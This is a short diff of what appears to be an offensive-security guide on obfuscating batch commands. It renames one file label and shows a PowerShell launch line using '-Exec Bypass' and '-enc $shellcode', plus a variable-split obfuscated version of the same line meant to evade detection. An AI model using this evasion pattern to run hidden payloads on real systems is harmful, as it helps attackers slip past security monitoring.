@@ -84,7 +84,7 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -Exec Bypass -noni -enc $shellcode`<br />
 
-- String obfuscated (**template.bat**)<br />
+- String obfuscated (**test.bat**)<br />
 
       @echo off
       %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
